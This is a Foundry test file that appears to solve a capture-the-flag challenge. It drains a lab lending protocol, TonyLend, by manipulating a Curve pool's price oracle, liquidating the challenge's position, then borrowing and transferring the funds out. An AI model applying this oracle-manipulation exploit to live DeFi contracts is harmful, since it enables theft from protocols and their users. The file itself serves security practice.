pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../src/Challenge.sol";




contract TLTest is Test {
    Challenge public challenge;
    address public usdcRich = address(0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341);
    address public usdeRich = address(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
    // IERC20 public usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // ICurve public curve = ICurve(0x02950460E2b9529D0E00284A5fA2d7bDF3fA4d72);
    // IERC20 public usde = IERC20(0x4c9EDD5852cd905f086C759E8383e09bff1E68B3);

    function setUp() public {
        vm.createSelectFork(
            "http://64.71.166.16/eth-chain",
            18580700
        );
        challenge = new Challenge();
        // challenge.deploy();
    }

    // function test_X() public {

    //     MintableERC20 usde = new MintableERC20("Wrapped USDe", "wUSDe");
    //     MintableERC20 usdc = new MintableERC20("Wrapped Tether USD", "wusdc");
    //     ICurveFactory curveDeployer = ICurveFactory(0x6A8cbed756804B16E05E741eDaBd5cB544AE21bf);


    //     address[] memory coins = new address[](2);
    //     coins[0] = address(usde);
    //     coins[1] = address(usdc);

    //     uint8[] memory asset_types = new uint8[](2);
    //     asset_types[0] = 0;
    //     asset_types[1] = 0;

    //     bytes4[] memory method_ids = new bytes4[](2);
    //     method_ids[0] = bytes4(0x00000000);
    //     method_ids[1] = bytes4(0x00000000);

    //     address[] memory oracles = new address[](2);
    //     oracles[0] = address(address(0));
    //     oracles[1] = address(address(0));

    //     address curvePool = curveDeployer.deploy_plain_pool(
    //         "USDe/usdc Curve Pool",
    //         "USDeusdc",
    //         coins,
    //         200,
    //         1000000,
    //         50000000000,
    //         866,
    //         0,
    //         asset_types,
    //         method_ids,
    //         oracles
    //     );

    //     ICurve curve = ICurve(curvePool);

    //     usde.approve(address(curve), type(uint256).max);
    //     usdc.approve(address(curve), type(uint256).max);

    //     uint256[] memory amounts = new uint256[](2);
    //     amounts[0] = 1e18 * 100000;
    //     amounts[1] = 1e6 * 100000;

    //     curve.add_liquidity(amounts, 0);
    //     console.log(curve.price_oracle(0));

    //     amounts[0] = 1e18 * 1;
    //     amounts[1] = 1e6 * 1;
    //     curve.add_liquidity(amounts, 0);

    //     amounts[0] = 1e18 * 1 / 2;
    //     amounts[1] = 1e6 * 1 / 2;
    //     curve.remove_liquidity_imbalance(amounts, type(uint256).max);

    //     vm.warp(block.timestamp + 300);
    //     console.log(curve.price_oracle(0));
    // }

    function manipulatePrice() public {
        ICurve curve = challenge.curvePool();
        IERC20 usde = IERC20(address(challenge.usde()));
        IERC20 usdc = IERC20(address(challenge.usdc()));
        usde.approve(address(curve), type(uint256).max);
        usdc.approve(address(curve), type(uint256).max);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1e18 * 1;
        amounts[1] = 1e6 * 1;

        curve.add_liquidity(amounts, 0);
        amounts[0] = 1e18 * 1 / 2;
        amounts[1] = 1e6 * 1 / 2;
        curve.remove_liquidity_imbalance(amounts, type(uint256).max);
        vm.warp(block.timestamp + 300);

        console.log(curve.price_oracle(0));
    }

    function manipulatePriceBack() public {
        ICurve curve = challenge.curvePool();
        IERC20 usde = IERC20(address(challenge.usde()));
        IERC20 usdc = IERC20(address(challenge.usdc()));
        usde.approve(address(curve), type(uint256).max);
        usdc.approve(address(curve), type(uint256).max);

        curve.exchange(0, 1, 1e18, 0);
        vm.warp(block.timestamp + 15 minutes);

        console.log(curve.price_oracle(0));
    }

    function simpleManipulatePrice() public {
        ICurve curve = challenge.curvePool();
        IERC20 usde = IERC20(address(challenge.usde()));
        IERC20 usdc = IERC20(address(challenge.usdc()));
        usde.approve(address(curve), type(uint256).max);
        usdc.approve(address(curve), type(uint256).max);
        
        curve.exchange(0, 1, usde.balanceOf(address(this)) / 2, 0);

        vm.warp(block.timestamp + 30000);

        console.log("price", curve.price_oracle(0));
    }

    function test_BadSolve() public {
        // challenge.deploy();
        challenge.claimDust();
        IERC20 usde = IERC20(address(challenge.usde()));
        IERC20 usdc = IERC20(address(challenge.usdc()));
        usde.approve(address(challenge.tonyLend()), type(uint256).max);
        usdc.approve(address(challenge.tonyLend()), type(uint256).max);
        console.log("usde before", usde.balanceOf(address(this)) / 1e18);
        console.log("usdc before", usdc.balanceOf(address(this)) / 1e6);
        console.log("total before", usde.balanceOf(address(this)) / 1e18 + usdc.balanceOf(address(this)) / 1e6);

        TonyLend tonyLend = challenge.tonyLend();
        
        tonyLend.deposit(0, usde.balanceOf(address(this)) / 2);
        tonyLend.borrow(1, usdc.balanceOf(address(this)) / 2);

        simpleManipulatePrice();

        console.log("hf =", tonyLend.calculateHealthFactor(address(this)));

        tonyLend.liquidate(address(this), 1, 1000e18, 0);

        console.log("usde after", usde.balanceOf(address(this)) / 1e18);
        console.log("usdc after", usdc.balanceOf(address(this)) / 1e6);

        console.log("total = ", usde.balanceOf(address(this)) / 1e18 + usdc.balanceOf(address(this)) / 1e6);

        console.log(challenge.isSolved());

    }

    function test_Solve() public {
        // challenge.deploy();
        challenge.claimDust();

        console.log("usde before", IERC20(address(challenge.usde())).balanceOf(address(this)) / 1e18);
        console.log("usdc before", IERC20(address(challenge.usdc())).balanceOf(address(this)) / 1e6);

        TonyLend tonyLend = challenge.tonyLend();


        console.log(tonyLend.calculateHealthFactor(
            address(challenge)
        ));

        manipulatePrice();

        console.log(
            tonyLend.calculateHealthFactor(
                address(challenge)
            )
        );


        console.log(IERC20(address(challenge.usdc())).balanceOf(address(tonyLend)));

        IERC20(address(challenge.usdc())).approve(address(tonyLend), type(uint256).max);

        console.log("usde before", IERC20(address(challenge.usde())).balanceOf(address(this)) / 1e18);
        console.log("usdc before", IERC20(address(challenge.usdc())).balanceOf(address(this)) / 1e6);

        tonyLend.liquidate(address(challenge), 1, 100e18, 0);


        console.log("usde after", IERC20(address(challenge.usde())).balanceOf(address(this)) / 1e18);
        console.log("usdc after", IERC20(address(challenge.usdc())).balanceOf(address(this)) / 1e6);

        tonyLend.deposit(1, IERC20(address(challenge.usdc())).balanceOf(address(this)));
        tonyLend.borrow(0, 1927 * 1e18);

        console.log(tonyLend.calculateHealthFactor(address(this)));
        console.log("usde after", IERC20(address(challenge.usde())).balanceOf(address(this)) / 1e18);

        IERC20(address(challenge.usde())).transfer(address(0xc0ffee), IERC20(address(challenge.usde())).balanceOf(address(this)));

        console.log(challenge.isSolved());

        // manipulatePriceBack();
        // tonyLend.addAsset(address(new FakeToken()), 0);

    }
}